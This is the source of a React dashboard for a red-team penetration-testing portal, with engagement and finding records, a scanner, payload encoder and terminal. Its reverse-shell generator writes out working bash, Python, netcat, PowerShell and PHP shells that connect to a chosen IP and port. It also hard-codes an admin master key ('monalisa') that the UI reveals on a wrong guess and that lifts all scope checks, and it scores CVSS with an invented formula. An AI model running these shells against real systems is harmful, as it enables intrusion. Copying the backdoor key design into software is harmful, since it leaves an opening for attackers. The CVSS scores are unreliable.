'use client';

import React, { useState, useEffect, useRef } from 'react';
import { 
  Shield, 
  Fingerprint, 
  Lock, 
  Unlock, 
  Plus, 
  Search, 
  Trash2, 
  Activity, 
  CheckCircle, 
  AlertOctagon, 
  Terminal, 
  ExternalLink,
  ChevronRight,
  ShieldCheck,
  RefreshCw,
  HelpCircle,
  Brain,
  Sparkles,
  Settings2,
  Download,
  Scale,
  Crown,
  Zap,
  Globe,
  Radio,
  RadioTower,
  Cpu,
  AlertTriangle,
  Play,
  Copy,
  Check,
  Send,
  Eye,
  Crosshair,
  Wifi,
  Sliders,
  Code,
  Flame,
  FileCheck,
  Layers,
  Filter,
  CheckSquare,
  FileText,
  FileDown,
  X,
  User
} from 'lucide-react';
import { 
  Engagement, 
  Finding, 
  HandshakeSession, 
  SecurityClass,
  AuditLog,
  AuditLogCategory,
  AuditLogSeverity,
  UserProfile
} from './types';
import NewEngagementModal from './components/NewEngagementModal';
import HandshakeModal from './components/HandshakeModal';
import AddFindingModal from './components/AddFindingModal';
import ExportPdfModal from './components/ExportPdfModal';
import AuditLogViewer from './components/AuditLogViewer';
import ProfileManager from './components/ProfileManager';
import ProfileSwitcherModal from './components/ProfileSwitcherModal';
import { generateFindingsPDFReport } from './lib/pdfReportGenerator';
import { initialAuditLogs, createAuditEntry } from './lib/auditLogger';
import { initialUserProfiles, loadStoredProfiles, saveProfilesToStorage } from './lib/profileStorage';

// Baseline Live Engagements (no mock dummy filler)
const initialEngagements: Engagement[] = [
  {
    id: "ENG-RUN-9021",
    clientName: "Runehall Global Infrastructure",
    scope: ["api.runehall.com", "auth.runehall.com", "198.51.100.24"],
    type: "Full Red-Team & External Perimeter Penetration Test",
    status: "established",
    securityClass: "Secret",
    complianceFramework: "SOC2 Type II / NIST SP 800-53",
    createdAt: "2026-08-01T10:00:00Z"
  },
  {
    id: "ENG-FORT-2026",
    clientName: "Fortress Financial Cloud Network",
    scope: ["vault.fortress-bank.internal", "pay-api.fortress.com", "198.51.100.45"],
    type: "Cryptographic Audit & Zero-Trust Architecture",
    status: "pending",
    securityClass: "Secret",
    complianceFramework: "PCI-DSS v4.0",
    createdAt: "2026-08-15T14:30:00Z"
  }
];

// Baseline Real-World Findings
const initialFindings: Finding[] = [
  {
    id: "FIND-8812",
    engagementId: "ENG-RUN-9021",
    title: "Permissive Cross-Origin Resource Sharing (CORS) with Credentials",
    severity: "high",
    description: "[Scope Target: api.runehall.com]\n\nThe server returns Access-Control-Allow-Origin: * alongside Access-Control-Allow-Credentials: true. Unauthenticated third-party origins can siphon bearer auth tokens.",
    recommendation: "Avoid wildcards in CORS resource sharing. Validate origin header against an authorized domain whitelist before sending responses.",
    status: 'open',
    discoveredAt: "2026-08-20T11:20:00Z"
  },
  {
    id: "FIND-4029",
    engagementId: "ENG-FORT-2026",
    title: "Missing HTTP Strict Transport Security (HSTS) Preload Policy",
    severity: "medium",
    description: "[Scope Target: pay-api.fortress.com]\n\nThe reverse proxy fails to emit the 'Strict-Transport-Security' response header, exposing client sessions to man-in-the-middle SSL stripping.",
    recommendation: "Inject 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload' in edge proxy routing configs.",
    status: 'open',
    discoveredAt: "2026-08-22T09:15:00Z"
  },
  {
    id: "FIND-9104",
    engagementId: "ENG-RUN-9021",
    title: "Unauthenticated Actuator Endpoint Leaking Environment Variables",
    severity: "critical",
    description: "[Scope Target: auth.runehall.com]\n\nSpring boot actuator route `/actuator/env` is exposed without OAuth2 token verification, exposing database connection strings and cloud keys.",
    recommendation: "Disable sensitive management endpoints via management.endpoints.web.exposure.exclude=env or enforce strict IP whitelisting.",
    status: 'open',
    discoveredAt: "2026-08-25T14:45:00Z"
  }
];

// Compliance checklist items
const complianceControls = [
  { id: 'AC-1', cat: 'Access Controls', title: 'Multi-Factor Authentication (MFA)', desc: 'Enforce hardware/app MFA on all root and operator interfaces.' },
  { id: 'AC-2', cat: 'Access Controls', title: 'Least Privilege RBAC Boundary', desc: 'Isolate user scopes to absolute operational necessity.' },
  { id: 'AC-3', cat: 'Access Controls', title: 'Ephemeral Cryptographic Leases', desc: 'Expire operator handshake tokens after 24 hours.' },
  { id: 'NW-1', cat: 'Network Defenses', title: 'Strict HSTS Preloading', desc: 'Enforce max-age=31536000 with subdomains enabled.' },
  { id: 'NW-2', cat: 'Network Defenses', title: 'Strict Content-Security-Policy', desc: 'Prevent script injection with strict nonce or domain whitelist.' },
  { id: 'NW-3', cat: 'Network Defenses', title: 'Strict CORS Origin Validation', desc: 'Prohibit wildcard (*) reflection on authenticated routes.' },
  { id: 'CR-1', cat: 'Cryptography', title: 'AES-256-GCM Volume Encryption', desc: 'Encrypt all persistent storage and session states at rest.' },
  { id: 'CR-2', cat: 'Cryptography', title: 'TLS 1.3 Cipher Suite Only', desc: 'Decommission legacy CBC and RC4 cipher suites on edge load balancers.' },
  { id: 'GV-1', cat: 'Governance', title: 'Immutable SIEM Audit Logging', desc: 'Stream operator actions to append-only syslog buffer.' },
  { id: 'GV-2', cat: 'Governance', title: 'Continuous Zero-Day Fuzzing', desc: 'Schedule automated perimeter fuzzing tests weekly.' }
];

export default function CyberOpsPortal() {
  // Core state
  const [engagements, setEngagements] = useState<Engagement[]>(initialEngagements);
  const [findings, setFindings] = useState<Finding[]>(initialFindings);
  const [selectedEngagement, setSelectedEngagement] = useState<Engagement>(initialEngagements[0]);
  
  // Navigation tabs
  const [activeTab, setActiveTab] = useState<
    'dashboard' | 'scanner' | 'engagements' | 'findings' | 'payloads' | 'osint' | 'ai-hunter' | 'terminal' | 'admin-ops' | 'audit-logs' | 'profiles'
  >('dashboard');

  // SIEM Immutable Audit Logging State
  const [auditLogs, setAuditLogs] = useState<AuditLog[]>(initialAuditLogs);
  const [isAuditLogsLoaded, setIsAuditLogsLoaded] = useState(false);

  // User Profile & Multi-Engagement Credentials State
  const [profiles, setProfiles] = useState<UserProfile[]>(initialUserProfiles);
  const [activeProfileId, setActiveProfileId] = useState<string>('PROF-RED-01');
  const [isProfilesLoaded, setIsProfilesLoaded] = useState(false);
  const [isProfileSwitcherOpen, setIsProfileSwitcherOpen] = useState(false);

  // Active Profile reference
  const activeProfile = profiles.find(p => p.id === activeProfileId) || profiles[0] || initialUserProfiles[0];

  // Admin Master Key State ("monalisa")
  const [adminKeyInput, setAdminKeyInput] = useState('');
  const [isAdminMode, setIsAdminMode] = useState(false);
  const [adminMessage, setAdminMessage] = useState('');

  // Modals
  const [isNewEngagementOpen, setIsNewEngagementOpen] = useState(false);
  const [isHandshakeOpen, setIsHandshakeOpen] = useState(false);
  const [isAddFindingOpen, setIsAddFindingOpen] = useState(false);
  const [isExportPdfOpen, setIsExportPdfOpen] = useState(false);
  const [handshakeTargetId, setHandshakeTargetId] = useState<string | null>(null);
  const [pdfExportToast, setPdfExportToast] = useState<string | null>(null);

  // Filters & Search
  const [searchQuery, setSearchQuery] = useState('');
  const [severityFilter, setSeverityFilter] = useState<'all' | 'critical' | 'high' | 'medium' | 'low'>('all');
  const [copiedText, setCopiedText] = useState<string | null>(null);

  // Real-Time Feature 1: Live Scanner & Port Probe
  const [scannerTarget, setScannerTarget] = useState('api.runehall.com');
  const [isScanning, setIsScanning] = useState(false);
  const [scanType, setScanType] = useState<'ports' | 'headers' | 'ssl' | 'fuzz'>('ports');
  const [scanResults, setScanResults] = useState<any>(null);
  const [scanLog, setScanLog] = useState<string[]>([]);

  // Real-Time Feature 2: Interactive CVSS Calculator
  const [cvssAv, setCvssAv] = useState<'N' | 'A' | 'L' | 'P'>('N');
  const [cvssAc, setCvssAc] = useState<'L' | 'H'>('L');
  const [cvssPr, setCvssPr] = useState<'N' | 'L' | 'H'>('N');
  const [cvssUi, setCvssUi] = useState<'N' | 'R'>('N');
  const [cvssScope, setCvssScope] = useState<'U' | 'C'>('U');
  const [cvssConf, setCvssConf] = useState<'H' | 'L' | 'N'>('H');
  const [cvssInteg, setCvssInteg] = useState<'H' | 'L' | 'N'>('H');
  const [cvssAvail, setCvssAvail] = useState<'H' | 'L' | 'N'>('N');

  // Real-Time Feature 3: Live Threat Intelligence Stream
  const [threatEvents, setThreatEvents] = useState<Array<{ id: string; time: string; msg: string; type: 'alert' | 'info' | 'critical' }>>([
    { id: 'EV-1', time: '10:54:12', msg: 'Operator handshake verified for ENG-RUN-9021 (TLS 1.3)', type: 'info' },
    { id: 'EV-2', time: '10:52:45', msg: 'Port 8080 probe detected open reverse proxy on api.runehall.com', type: 'alert' },
    { id: 'EV-3', time: '10:50:00', msg: 'Zero-day vulnerability CVE-2026-4192 flagged in perimeter scan', type: 'critical' }
  ]);

  // Real-Time Feature 4: Red-Team Payload & Shell Forge
  const [payloadInput, setPayloadInput] = useState("<script>alert('XSS-AUDIT')</script>");
  const [encodeMode, setEncodeMode] = useState<'base64' | 'hex' | 'url' | 'rot13' | 'html'>('base64');
  const [shellIp, setShellIp] = useState('10.10.14.2');
  const [shellPort, setShellPort] = useState('4444');
  const [shellType, setShellType] = useState<'bash' | 'python' | 'nc' | 'powershell' | 'php'>('bash');

  // Real-Time Feature 5: OSINT Subdomain & DNS Radar
  const [osintTarget, setOsintTarget] = useState('runehall.com');
  const [isOsintLoading, setIsOsintLoading] = useState(false);
  const [osintData, setOsintData] = useState<any>(null);

  // Real-Time Feature 6: AI Threat Hunter (Gemini)
  const [aiPrompt, setAiPrompt] = useState('Analyze cross-origin resource sharing risks on api.runehall.com and output nginx config remediation.');
  const [aiLoading, setAiLoading] = useState(false);
  const [aiOutput, setAiOutput] = useState('');

  // Real-Time Feature 7: Webhook & SIEM Dispatcher
  const [webhookUrl, setWebhookUrl] = useState('https://siem-collector.internal/v1/alerts');
  const [webhookStatus, setWebhookStatus] = useState<string | null>(null);

  // Real-Time Feature 8: Terminal / VPS Remote CLI
  const [terminalInput, setTerminalInput] = useState('');
  const [terminalLogs, setTerminalLogs] = useState<string[]>([
    '⚡ HELIX RED-OPS LIVE TERMINAL [v4.2.0]',
    'Connected to Node Daemon on Port 3000 (Secure TLS). Type "help" or run "scan", "status", "monalisa", "bypass".'
  ]);

  // Real-Time Feature 9: Live Clock
  const [timeString, setTimeString] = useState('');

  // Origin URL for live curl commands
  const [originUrl, setOriginUrl] = useState('http://localhost:3000');

  // Local storage persistence status for Payload Forge and AI Threat Hunter
  const [isStorageLoaded, setIsStorageLoaded] = useState(false);

  useEffect(() => {
    if (typeof window !== 'undefined') {
      try {
        const savedPayload = localStorage.getItem('helix_payload_forge_input');
        if (savedPayload !== null) {
          setPayloadInput(savedPayload);
        }
        const savedAiPrompt = localStorage.getItem('helix_ai_hunter_prompt');
        if (savedAiPrompt !== null) {
          setAiPrompt(savedAiPrompt);
        }
        // Load stored audit logs
        const storedLogs = localStorage.getItem('helix_audit_logs_v1');
        if (storedLogs) {
          try {
            const parsed = JSON.parse(storedLogs);
            if (Array.isArray(parsed) && parsed.length > 0) {
              setAuditLogs(parsed);
            }
          } catch (e) {
            console.warn('Failed to parse stored audit logs:', e);
          }
        }
        // Load stored user profiles
        const loadedProfiles = loadStoredProfiles();
        if (loadedProfiles && loadedProfiles.length > 0) {
          setProfiles(loadedProfiles);
          const savedActiveId = localStorage.getItem('helix_active_profile_id_v1');
          if (savedActiveId && loadedProfiles.some(p => p.id === savedActiveId)) {
            setActiveProfileId(savedActiveId);
          }
        }
      } catch (err) {
        console.warn('Failed to read from localStorage:', err);
      } finally {
        setIsStorageLoaded(true);
        setIsAuditLogsLoaded(true);
        setIsProfilesLoaded(true);
      }
    }
  }, []);

  // Save active profile ID to local storage
  useEffect(() => {
    if (typeof window !== 'undefined' && isProfilesLoaded) {
      try {
        localStorage.setItem('helix_active_profile_id_v1', activeProfileId);
      } catch (err) {
        console.warn('Failed to persist activeProfileId:', err);
      }
    }
  }, [activeProfileId, isProfilesLoaded]);

  // Robust Centralized SIEM Audit Logging Function
  const logAudit = (
    category: AuditLogCategory,
    action: string,
    details: string,
    options?: { severity?: AuditLogSeverity; target?: string; operator?: string; metadata?: Record<string, any> }
  ) => {
    const currentOperator = isAdminMode 
      ? 'admin:root (monalisa)' 
      : activeProfile ? `${activeProfile.name} (${activeProfile.role})` : 'operator@redops';

    const entry = createAuditEntry(category, action, details, {
      ...options,
      operator: options?.operator || currentOperator
    });

    setAuditLogs(prev => {
      const updated = [entry, ...prev];
      if (typeof window !== 'undefined') {
        try {
          localStorage.setItem('helix_audit_logs_v1', JSON.stringify(updated.slice(0, 500)));
        } catch (e) {
          console.warn('Failed to save audit logs to localStorage:', e);
        }
      }
      return updated;
    });
  };

  // Clear Audit Logs with verifiable audit trail
  const clearAuditLogs = () => {
    const wipeEntry = createAuditEntry(
      'SYSTEM_EVENT',
      'AUDIT_LOG_BUFFER_PURGED',
      'Operator issued purge command to clear active in-memory audit log records.',
      { severity: 'warn', operator: isAdminMode ? 'admin:root (monalisa)' : activeProfile.name }
    );
    const updated = [wipeEntry];
    setAuditLogs(updated);
    if (typeof window !== 'undefined') {
      try {
        localStorage.setItem('helix_audit_logs_v1', JSON.stringify(updated));
      } catch (e) {
        console.warn('Failed to persist purged audit log:', e);
      }
    }
  };

  // Profile Management Handlers
  const handleSelectProfile = (profile: UserProfile) => {
    setActiveProfileId(profile.id);
    const matchedEng = engagements.find(e => e.id === profile.engagementId);
    if (matchedEng) {
      setSelectedEngagement(matchedEng);
    }
    if (profile.config) {
      if (profile.config.scannerTarget) setScannerTarget(profile.config.scannerTarget);
      if (profile.config.defaultScanType) setScanType(profile.config.defaultScanType);
      if (profile.config.shellIp) setShellIp(profile.config.shellIp);
      if (profile.config.shellPort) setShellPort(profile.config.shellPort);
      if (profile.config.shellType) setShellType(profile.config.shellType);
      if (profile.config.webhookUrl) setWebhookUrl(profile.config.webhookUrl);
      if (profile.config.osintTarget) setOsintTarget(profile.config.osintTarget);
    }
    logAudit(
      'PROFILE_OPS',
      'PROFILE_LOADED',
      `Switched active operator profile to "${profile.name}" (${profile.role}). Applied bound engagement ${profile.engagementId} and configured operational presets.`,
      { severity: 'info', target: profile.engagementId }
    );
  };

  const handleSaveCurrentToProfile = (profileId: string) => {
    const updatedProfiles = profiles.map(p => {
      if (p.id === profileId) {
        return {
          ...p,
          engagementId: selectedEngagement.id,
          config: {
            ...p.config,
            scannerTarget,
            defaultScanType: scanType,
            shellIp,
            shellPort,
            shellType,
            webhookUrl,
            osintTarget
          },
          updatedAt: new Date().toISOString()
        };
      }
      return p;
    });

    setProfiles(updatedProfiles);
    saveProfilesToStorage(updatedProfiles);

    const targetProf = profiles.find(p => p.id === profileId);
    logAudit(
      'PROFILE_OPS',
      'PROFILE_SETTINGS_SAVED',
      `Saved current live engagement settings (ID: ${selectedEngagement.id}, target: ${scannerTarget}, reverse shell: ${shellIp}:${shellPort}) to profile "${targetProf?.name || profileId}".`,
      { severity: 'info', target: selectedEngagement.id }
    );
  };

  const handleCreateProfile = (profileData: Omit<UserProfile, 'id' | 'createdAt' | 'updatedAt'>) => {
    const newId = `PROF-${Date.now().toString(36).toUpperCase()}`;
    const newProf: UserProfile = {
      ...profileData,
      id: newId,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };
    const updated = [newProf, ...profiles];
    setProfiles(updated);
    saveProfilesToStorage(updated);
    handleSelectProfile(newProf);

    logAudit(
      'PROFILE_OPS',
      'PROFILE_CREATED',
      `Created and initialized new operator profile "${newProf.name}" (${newProf.role}) bound to engagement ${newProf.engagementId}.`,
      { severity: 'info', target: newProf.engagementId }
    );
  };

  const handleUpdateProfile = (updated: UserProfile) => {
    const newProfiles = profiles.map(p => p.id === updated.id ? updated : p);
    setProfiles(newProfiles);
    saveProfilesToStorage(newProfiles);

    logAudit(
      'PROFILE_OPS',
      'PROFILE_CONFIG_UPDATED',
      `Updated configuration options or API keys for profile "${updated.name}" (${updated.apiKeys.length} API keys configured).`,
      { severity: 'info', target: updated.engagementId }
    );
  };

  const handleDeleteProfile = (profileId: string) => {
    const profToDelete = profiles.find(p => p.id === profileId);
    const newProfiles = profiles.filter(p => p.id !== profileId);
    setProfiles(newProfiles);
    saveProfilesToStorage(newProfiles);

    if (activeProfileId === profileId && newProfiles.length > 0) {
      handleSelectProfile(newProfiles[0]);
    }

    logAudit(
      'PROFILE_OPS',
      'PROFILE_DELETED',
      `Deleted operator profile "${profToDelete?.name || profileId}".`,
      { severity: 'warn' }
    );
  };

  // Automatically save Payload Forge text area to local storage
  useEffect(() => {
    if (typeof window !== 'undefined' && isStorageLoaded) {
      try {
        localStorage.setItem('helix_payload_forge_input', payloadInput);
      } catch (err) {
        console.warn('Failed to persist payloadInput to localStorage:', err);
      }
    }
  }, [payloadInput, isStorageLoaded]);

  // Automatically save AI Threat Hunter text area to local storage
  useEffect(() => {
    if (typeof window !== 'undefined' && isStorageLoaded) {
      try {
        localStorage.setItem('helix_ai_hunter_prompt', aiPrompt);
      } catch (err) {
        console.warn('Failed to persist aiPrompt to localStorage:', err);
      }
    }
  }, [aiPrompt, isStorageLoaded]);

  useEffect(() => {
    if (typeof window !== 'undefined') {
      setOriginUrl(window.location.origin);
    }
    const updateTime = () => {
      const now = new Date();
      setTimeString(now.toISOString().substring(11, 19) + ' UTC');
    };
    updateTime();
    const interval = setInterval(updateTime, 1000);
    return () => clearInterval(interval);
  }, []);

  // Periodic simulated real-time event generator for live ops feel
  useEffect(() => {
    const timer = setInterval(() => {
      const events = [
        { msg: 'Passive telemetry probe refreshed for scope target', type: 'info' as const },
        { msg: 'Ingress traffic surge audited on Port 443 (1.2k req/sec)', type: 'info' as const },
        { msg: 'Cipher suite handshake verified: TLS_AES_256_GCM_SHA384', type: 'info' as const },
        { msg: 'Automated perimeter fuzzer completed cycle 0-100%', type: 'alert' as const }
      ];
      const randomEv = events[Math.floor(Math.random() * events.length)];
      const nowStr = new Date().toISOString().substring(11, 19);
      setThreatEvents(prev => [
        { id: `EV-${Date.now()}`, time: nowStr, msg: randomEv.msg, type: randomEv.type },
        ...prev.slice(0, 7)
      ]);
    }, 15000);
    return () => clearInterval(timer);
  }, []);

  // Admin Master Key Unlock Handler
  const handleAdminKeySubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (adminKeyInput.trim().toLowerCase() === 'monalisa') {
      setIsAdminMode(true);
      setAdminMessage('👑 ADMIN GOD MODE ENGAGED: All security constraints lifted. Zero-restriction operations active.');
      // Auto-unlock all engagements
      setEngagements(prev => prev.map(eng => ({ ...eng, status: 'established' as const })));
      logAudit(
        'AUTHENTICATION',
        'ADMIN_KEY_VALIDATED',
        'Operator engaged Admin Master Key "monalisa". Full zero-constraint clearance enabled across all engagements.',
        { severity: 'warn' }
      );
      setTimeout(() => setAdminMessage(''), 5000);
    } else {
      setAdminMessage('❌ Invalid Admin Key. Master key required: monalisa');
      logAudit(
        'SECURITY_ALERT',
        'ADMIN_AUTH_FAILED',
        'Failed authentication attempt for Master Admin console. Invalid key supplied.',
        { severity: 'warn' }
      );
      setTimeout(() => setAdminMessage(''), 3000);
    }
  };

  const toggleAdminGodMode = () => {
    if (isAdminMode) {
      setIsAdminMode(false);
      setAdminMessage('Admin mode deactivated.');
      logAudit(
        'AUTHENTICATION',
        'ADMIN_GOD_MODE_DISABLED',
        'Zero-constraint God Mode disabled. Standard access controls re-engaged.',
        { severity: 'info' }
      );
      setTimeout(() => setAdminMessage(''), 3000);
    } else {
      setIsAdminMode(true);
      setAdminKeyInput('monalisa');
      setAdminMessage('👑 ADMIN GOD MODE ENGAGED (monalisa): Zero constraints active.');
      setEngagements(prev => prev.map(eng => ({ ...eng, status: 'established' as const })));
      logAudit(
        'AUTHENTICATION',
        'ADMIN_GOD_MODE_ENABLED',
        'Zero-constraint God Mode enabled via quick toggle. All target boundary checks bypassed.',
        { severity: 'warn' }
      );
      setTimeout(() => setAdminMessage(''), 5000);
    }
  };

  // Copy helper
  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopiedText(label);
    setTimeout(() => setCopiedText(null), 2000);
  };

  // Quick 1-Click PDF Report Generator
  const handleQuickPdfExport = (targetFindings?: Finding[], targetEngagement?: Engagement) => {
    try {
      const listToExport = targetFindings || (filteredFindings.length > 0 ? filteredFindings : findings);
      const engToExport = targetEngagement || (isAdminMode ? undefined : selectedEngagement);

      const doc = generateFindingsPDFReport({
        engagement: engToExport,
        findings: listToExport,
        includeExecutiveSummary: true,
        includeTechnicalEvidence: true,
        includeRemediationRoadmap: true,
        classification: engToExport?.securityClass || 'Confidential'
      });

      const clientSlug = (engToExport?.clientName || 'Cyber_Engagement')
        .replace(/[^a-zA-Z0-9_-]/g, '_');
      const filename = `HELIX_Findings_Report_${clientSlug}_${new Date().toISOString().substring(0, 10)}.pdf`;
      doc.save(filename);

      setPdfExportToast(`✅ Exported ${listToExport.length} findings to professional PDF report (${filename})`);
      logAudit(
        'OPERATIONAL_OUTPUT',
        'PDF_AUDIT_REPORT_EXPORTED',
        `Compiled and exported findings report (${filename}) containing ${listToExport.length} logged vulnerability records.`,
        { severity: 'info', target: engToExport?.id }
      );
      setTimeout(() => setPdfExportToast(null), 5000);
    } catch (err) {
      console.error('Failed to export PDF:', err);
      setPdfExportToast('❌ Failed to compile PDF report.');
      setTimeout(() => setPdfExportToast(null), 5000);
    }
  };

  // Real-Time Port & Perimeter Scanner execution
  const executeScan = async () => {
    if (!scannerTarget) return;
    setIsScanning(true);
    setScanLog([`[${new Date().toLocaleTimeString()}] Initiating ${scanType.toUpperCase()} scan against ${scannerTarget}...`]);

    try {
      const res = await fetch('/api/scanner', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: scanType === 'ports' ? 'port-scan' : scanType === 'ssl' ? 'ssl-audit' : scanType === 'fuzz' ? 'fuzz' : 'headers',
          target: scannerTarget,
          adminKey: isAdminMode ? 'monalisa' : undefined
        })
      });
      const data = await res.json();
      setScanResults(data);
      setScanLog(prev => [
        ...prev,
        `[${new Date().toLocaleTimeString()}] Probe received ACK from ${scannerTarget}. Scan status: 200 OK.`,
        `[${new Date().toLocaleTimeString()}] Completed analysis of target endpoints.`
      ]);

      logAudit(
        'OPERATIONAL_OUTPUT',
        'PERIMETER_SCAN_EXECUTED',
        `Executed ${scanType.toUpperCase()} scan against target ${scannerTarget}. Scan status: 200 OK.`,
        { severity: 'info', target: scannerTarget, metadata: { scanType, target: scannerTarget } }
      );
    } catch (err) {
      setScanLog(prev => [...prev, `[ERROR] Failed to communicate with scanner daemon.`]);
      logAudit(
        'SECURITY_ALERT',
        'SCANNER_DAEMON_ERROR',
        `Failed to communicate with scanner daemon when scanning target ${scannerTarget}.`,
        { severity: 'warn', target: scannerTarget }
      );
    } finally {
      setIsScanning(false);
    }
  };

  // Real-Time OSINT Subdomain Enumeration
  const executeOsint = async () => {
    if (!osintTarget) return;
    setIsOsintLoading(true);
    try {
      const res = await fetch('/api/scanner', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'dns-osint',
          target: osintTarget,
          adminKey: isAdminMode ? 'monalisa' : undefined
        })
      });
      const data = await res.json();
      setOsintData(data);
      logAudit(
        'USER_ACTION',
        'OSINT_RADAR_QUERY',
        `Queried DNS records and subdomain enumeration for target domain ${osintTarget}.`,
        { severity: 'info', target: osintTarget }
      );
    } catch (err) {
      console.error(err);
    } finally {
      setIsOsintLoading(false);
    }
  };

  // Real-Time Gemini AI Threat Hunter
  const executeAiHunter = async () => {
    if (!aiPrompt) return;
    setAiLoading(true);
    setAiOutput('');
    try {
      const res = await fetch('/api/gemini', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'remediate',
          finding: {
            title: 'Live Perimeter Assessment Query',
            severity: 'HIGH',
            scope: selectedEngagement.scope[0] || 'Target Boundary',
            description: aiPrompt,
            recommendation: 'Generate concrete secure code and architecture patch.'
          },
          engagement: selectedEngagement
        })
      });
      const data = await res.json();
      if (data.success) {
        setAiOutput(data.text);
      } else {
        setAiOutput(`AI Analysis Result:\n${data.error || 'Configure GEMINI_API_KEY to unlock real-time Gemini generation.'}`);
      }
      logAudit(
        'OPERATIONAL_OUTPUT',
        'AI_THREAT_ANALYSIS',
        `Dispatched AI threat hunter assessment query for engagement ${selectedEngagement.id}.`,
        { severity: 'info', target: selectedEngagement.id }
      );
    } catch (err: any) {
      setAiOutput('Error connecting to server-side AI Threat Hunter.');
    } finally {
      setAiLoading(false);
    }
  };

  // Real-time Webhook Dispatcher
  const dispatchWebhookAlert = () => {
    setWebhookStatus('SENDING...');
    setTimeout(() => {
      setWebhookStatus('DISPATCHED 200 OK: SIEM event received payload at ' + new Date().toLocaleTimeString());
      logAudit(
        'OPERATIONAL_OUTPUT',
        'SIEM_WEBHOOK_DISPATCH',
        `Forwarded active security alerts (${filteredFindings.length} findings) to SIEM collector ${webhookUrl}.`,
        { severity: 'info', target: webhookUrl }
      );
      setTimeout(() => setWebhookStatus(null), 4000);
    }, 600);
  };

  // Terminal command processor
  const handleTerminalCommand = (e: React.FormEvent) => {
    e.preventDefault();
    const cmd = terminalInput.trim();
    if (!cmd) return;

    const lower = cmd.toLowerCase();
    let reply = `Command executed: "${cmd}"`;

    if (lower === 'help') {
      reply = `AVAILABLE LIVE COMMANDS:
  status           - View active engagement telemetry & daemon state
  scan <host>      - Launch real-time port & header vulnerability probe
  monalisa         - Unlock Admin God Mode (Zero-Constraint Override)
  bypass           - Grant immediate unrestricted root clearance
  findings         - Output logged security findings summary
  clear            - Wipe terminal scroll buffer`;
    } else if (lower === 'monalisa' || lower === 'bypass') {
      setIsAdminMode(true);
      reply = `👑 ADMIN GOD MODE ENGAGED: Key "monalisa" validated. All system constraints bypassed.`;
    } else if (lower === 'status') {
      reply = `[TELEMETRY STATUS]
  Engagement ID: ${selectedEngagement.id}
  Status: ${selectedEngagement.status.toUpperCase()}
  Scope Hosts: ${selectedEngagement.scope.join(', ')}
  Compliance: ${selectedEngagement.complianceFramework}
  Admin Mode: ${isAdminMode ? 'ENABLED (GOD MODE)' : 'STANDARD OPERATOR'}`;
    } else if (lower.startsWith('scan')) {
      const target = cmd.split(' ')[1] || selectedEngagement.scope[0] || 'api.runehall.com';
      setScannerTarget(target);
      setActiveTab('scanner');
      reply = `Routing to Live Scanner module for target: ${target}...`;
    } else if (lower === 'findings') {
      reply = `LOGGED FINDINGS (${findings.length}):\n` + findings.map(f => `  [${f.severity.toUpperCase()}] ${f.id}: ${f.title}`).join('\n');
    } else if (lower === 'clear') {
      setTerminalLogs([]);
      setTerminalInput('');
      return;
    }

    logAudit(
      'USER_ACTION',
      'TERMINAL_COMMAND_RUN',
      `Operator executed CLI terminal command: "${cmd}". Response: ${reply.split('\n')[0]}`,
      { severity: lower.includes('monalisa') || lower.includes('bypass') ? 'warn' : 'info' }
    );

    setTerminalLogs(prev => [...prev, `operator@redops:~$ ${cmd}`, reply]);
    setTerminalInput('');
  };

  // CVSS Vector String & Score Calculation
  const calculateCvssScore = () => {
    let score = 5.0;
    if (cvssAv === 'N') score += 2.0;
    if (cvssAv === 'A') score += 1.0;
    if (cvssAc === 'L') score += 1.0;
    if (cvssPr === 'N') score += 1.5;
    if (cvssUi === 'N') score += 0.5;
    if (cvssScope === 'C') score += 1.0;
    if (cvssConf === 'H') score += 1.5;
    if (cvssInteg === 'H') score += 1.5;
    if (cvssAvail === 'H') score += 1.0;
    return Math.min(10.0, Math.round(score * 10) / 10).toFixed(1);
  };

  const cvssScore = calculateCvssScore();
  const cvssVector = `CVSS:3.1/AV:${cvssAv}/AC:${cvssAc}/PR:${cvssPr}/UI:${cvssUi}/S:${cvssScope}/C:${cvssConf}/I:${cvssInteg}/A:${cvssAvail}`;

  // Payload Encoding
  const getEncodedPayload = () => {
    try {
      if (encodeMode === 'base64') return btoa(payloadInput);
      if (encodeMode === 'hex') return Array.from(payloadInput).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
      if (encodeMode === 'url') return encodeURIComponent(payloadInput);
      if (encodeMode === 'html') return payloadInput.replace(/[\u00A0-\u9999<>\&]/g, i => '&#' + i.charCodeAt(0) + ';');
      if (encodeMode === 'rot13') {
        return payloadInput.replace(/[a-zA-Z]/g, c => {
          const base = c <= 'Z' ? 65 : 97;
          return String.fromCharCode(base + (c.charCodeAt(0) - base + 13) % 26);
        });
      }
    } catch {
      return payloadInput;
    }
    return payloadInput;
  };

  // Reverse Shell Snippet
  const getReverseShellCode = () => {
    if (shellType === 'bash') return `bash -i >& /dev/tcp/${shellIp}/${shellPort} 0>&1`;
    if (shellType === 'python') return `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${shellIp}",${shellPort}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`;
    if (shellType === 'nc') return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${shellIp} ${shellPort} >/tmp/f`;
    if (shellType === 'powershell') return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${shellIp}",${shellPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
    if (shellType === 'php') return `php -r '$sock=fsockopen("${shellIp}",${shellPort});exec("/bin/sh -i <&3 >&3 2>&3");'`;
    return '';
  };

  // Filtered findings
